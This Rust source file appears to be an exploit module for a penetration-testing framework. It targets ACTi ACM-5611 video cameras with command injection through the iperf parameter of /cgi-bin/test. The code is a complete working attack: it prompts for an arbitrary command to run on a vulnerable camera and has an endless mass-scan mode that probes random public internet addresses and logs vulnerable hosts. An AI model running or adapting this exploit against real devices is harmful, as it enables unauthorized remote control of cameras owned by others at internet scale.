use anyhow::{anyhow, Result, Context};
use colored::*;
use std::io::Write;
use reqwest::Client;
use std::time::Duration;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use tokio::sync::Semaphore;
use tokio::sync::mpsc;
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;
use ipnetwork::IpNetwork;
use std::net::{IpAddr, Ipv4Addr};
use rand::Rng;
use chrono::Local;
use crate::utils::{prompt_default, prompt_yes_no, prompt_port};



/// Executes an RCE on ACTi ACM-5611 Video Camera using command injection
/// Reference:
/// - https://www.exploitalert.com/view-details.html?id=34128
/// - https://packetstormsecurity.com/files/154626/ACTi-ACM-5611-Video-Camera-Remote-Command-Execution.html

/// Exploit authors:
/// - Todor Donev <todor.donev@gmail.com>
/// - GH0st3rs (RouterSploit module)

const DEFAULT_PORT: u16 = 8080;
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const MASS_SCAN_CONCURRENCY: usize = 100;

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}


/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ACTi ACM-5611 Video Camera RCE Exploit                  ║".cyan());
    println!("{}", "║   Command Injection via /cgi-bin/test                     ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

async fn run_mass_scan() -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0 (Random Internet Scan)".yellow().bold());

    let port = prompt_port("Target Port", 8080)?;
    
    let use_exclusions = prompt_yes_no("[?] Exclude reserved/private ranges?", true)?;
    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);

    let outfile = prompt_default("[?] Output File", "acti_rce_hits.txt")?;
    let outfile = Arc::new(outfile);

    let threads = prompt_default("[?] Concurrency (IPs)", &MASS_SCAN_CONCURRENCY.to_string())?
    .parse().unwrap_or(MASS_SCAN_CONCURRENCY);

    let semaphore = Arc::new(Semaphore::new(threads));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();

    let outfile_clone = outfile.clone();
    tokio::spawn(async move {
        let file_result = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&*outfile_clone)
        .await;

        let mut file = match file_result {
            Ok(f) => f,
            Err(e) => {
                eprintln!("[-] Failed to open output file: {}", e);
                return;
            }
        };

        while let Some(result) = rx.recv().await {
            let _ = file.write_all(result.as_bytes()).await;
        }
    });

    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });

    println!("{}", "[*] Starting infinite mass scan... Press Ctrl+C to stop.".cyan());

    loop {
        let permit = semaphore.clone().acquire_owned().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let tx = tx.clone();
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc).to_string();
            
            if let Ok(true) = check(&ip, port).await {
                 println!("{}", format!("[+] VULNERABLE: {}:{}", ip, port).green().bold());
                 fnd.fetch_add(1, Ordering::Relaxed);
                 let log_entry = format!("[{}] {}:{} - VULNERABLE\n", Local::now().format("%Y-%m-%d %H:%M:%S"), ip, port);
                 let _ = tx.send(log_entry);
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}


pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target == "random" {
        return run_mass_scan().await;
    }

    display_banner();
    
    // Check for CIDR or Range
    let is_mass_scan = target.contains('/') || target.contains('-');
    
    // Prompt for port globally
    let port = prompt_port("Target Port", DEFAULT_PORT)?;

    if is_mass_scan {
        println!("{}", format!("[*] Mass Scan Mode: {}", target).yellow());
        
        let ips: Vec<IpAddr> = if target.contains('/') {
            // CIDR
            let net: IpNetwork = target.parse().map_err(|_| anyhow!("Invalid CIDR"))?;
            net.iter().collect()
        } else {
            // Range (basic impl for dash)
            // For now, let's assume specific basic range or just use utils if available.
            // But since utils::expand might not be exposed, let's just stick to CIDR support for now 
            // or simple parsing if the user provided a list.
            // Actually, let's use a simple heuristic: if it has -, try to parse start/end? 
            // For robustness, let's assume CIDR only or single for now unless we implement range expander.
            // However, user asked for "mass scan", likely CIDR.
            
            // Re-use logic from other modules?
             return Err(anyhow!("Only CIDR (e.g. 192.168.1.0/24) supported for mass scan currently."));
        };

        println!("{}", format!("[*] Scanning {} targets...", ips.len()).cyan());
        
        let concurrency = 50; 
        let semaphore = Arc::new(Semaphore::new(concurrency));
        let vulnerable_count = Arc::new(AtomicUsize::new(0));
        let mut tasks = Vec::new();

        for ip in ips {
            let sem = semaphore.clone();
            let vc = vulnerable_count.clone();
            let ip_str = ip.to_string();
            
            tasks.push(tokio::spawn(async move {
                let _permit = match sem.acquire().await {
                    Ok(p) => p,
                    Err(_) => return, // Semaphore closed, exit gracefully
                };
                if let Ok(true) = check(&ip_str, port).await {
                    println!("{}", format!("[+] VULNERABLE: {}:{}", ip_str, port).green().bold());
                    vc.fetch_add(1, Ordering::Relaxed);
                }
                drop(_permit);
            }));
        }
        
        for t in tasks {
            let _ = t.await;
        }
        
        println!("\n{}", format!("[*] Scan Complete. Found {} vulnerable targets.", vulnerable_count.load(Ordering::Relaxed)).green().bold());
        
    } else {
        // Single Target Mode (Original Logic)
        println!("{}", format!("[*] Checking vulnerability on {}:{}...", target, port).yellow());

        if check(target, port).await? {
            println!("{}", format!("[+] Target appears vulnerable: {}:{}", target, port).green().bold());

            // Prompt for command to execute
            print!("{}", "Enter command to execute (default: id): ".cyan().bold());
            std::io::stdout()
                .flush()
                .context("Failed to flush stdout")?;
            let mut cmd_input = String::new();
            std::io::stdin()
                .read_line(&mut cmd_input)
                .context("Failed to read command input")?;
            let cmd = {
                let t = cmd_input.trim();
                if t.is_empty() { "id" } else { t }
            };

            println!("{}", format!("[*] Executing command: {}", cmd).cyan());
            let output = execute(target, port, cmd).await?;
            println!("{}", format!("[+] Output:\n{}", output).green());
        } else {
            println!("{}", format!("[-] Exploit failed - target {}:{} does not seem vulnerable", target, port).red());
        }
    }

    Ok(())
}

/// Perform a command injection via GET /cgi-bin/test?iperf=;<cmd>
async fn execute(target: &str, port: u16, cmd: &str) -> Result<String> {
    let url = format!("http://{}:{}/cgi-bin/test", target, port);
    let client = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()?;

    let url = reqwest::Url::parse_with_params(&url, &[("iperf", format!(";{}", cmd))])?;

    let res = client
        .get(url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Referer", format!("http://{}:{}", target, port))
        .send()
        .await?;

    if res.status().is_success() {
        let text = res.text().await?;
        Ok(text)
    } else {
        Err(anyhow!("Command execution failed, status code: {}", res.status()))
    }
}

/// Check if the target is running the vulnerable service
async fn check(target: &str, port: u16) -> Result<bool> {
    let url = format!("http://{}:{}/cgi-bin/test", target, port);
    let index_url = format!("http://{}:{}/", target, port);
    let client = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()?;

    // Check /cgi-bin/test
    let test_res = client.get(&url).send().await?;
    if test_res.status().is_success() {
        println!("{}", "[*] CGI endpoint accessible".cyan());
        // Check root page contains 'Web Configurator'
        let index_res = client.get(&index_url).send().await?;
        if index_res.status().is_success() {
            let body = index_res.text().await?;
            if body.contains("Web Configurator") {
                println!("{}", "[*] ACTi Web Configurator detected".cyan());
                return Ok(true);
            }
        }
    }

    Ok(false)
}
